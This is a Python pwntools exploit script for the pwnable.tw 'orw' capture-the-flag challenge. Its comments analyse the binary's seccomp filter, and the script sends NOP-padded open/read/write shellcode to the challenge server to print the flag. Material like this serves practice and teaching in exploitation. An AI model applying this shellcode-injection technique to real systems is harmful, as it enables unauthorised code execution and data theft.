#!/usr/bin/env python3
from pwn import *
URL = "chall.pwnable.tw"
PORT = 10001


if len(sys.argv) >= 2 and sys.argv[1] == "remote":
    p = remote(URL, PORT)
else:
    p = process("./bin/orw")


# This program calls seccomp() and then runs the shellcode provided by users.
# The challenge is to identify the seccomp policy
# at 0x8048526: prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=12, filter=xx})
# this is exactly seccomp(len=12, filter=xx).
# the seccomp filter points to the following object:
#   struct sock_fprog {
#       unsigned short len; /* Number of BPF instructions */
#       struct sock_filter *filter; /* Pointer to arrays
#                                      of BPF instrucitons*/
#   };
#
# where the filter structured as follow:
#   struct sock_filter { /* filter block */
#       __u16 code;  /* actual filter code */
#       __u8 jt;     /* Jump true */
#       __u8 jf;     /* Jump false */
#       __u32 k;     /* Generic Multiuse field */
#   };
# it seems the seccomp are set with filter code 0x0020, 0x0015, 0x0006


# Since we can only use open(), read(), and write() syscalls, we do not launch a
# shell. Instead, we print out the flag on our screen with write().
#
# Note that we need a buffer for read()ing the data. Normally, we have to leak a
# stack address and make that as the buffer. However, in this case, we can
# simplify it: using the FIXED HEAP ADDRESS
# The flag loader is loaded at 0x804a060. Of course the code should not
# overwrite the code sequence because it breaks the loader code. However,
# we can pad No-OP and make it as a buffer. The heap is of size 0xc8 which is
# large enough to do this. In short, flag_loader should be like:
#
#   | NOP NOP NOP NOP NOP ... | open("..flag"); read(); write() |
#   ^0x804a060                                                  ^+0xc8

HEAP_ADDR = 0x804a060
HEAP_SIZE = 0xc8

with open("flag_ldr/flag_ldr.bin", "rb") as f:
    flag_loader = f.read()
    f.close()
flag_loader = flag_loader.rjust(HEAP_SIZE, b'\x90')

if len(sys.argv) >= 2 and sys.argv[1] == 'debug':
    with open("./payload", "wb") as fw:
        fw.write(flag_loader)
        fw.close()


p.recvuntil(b"Give my your shellcode:")
p.send(flag_loader)
print(p.recvall())

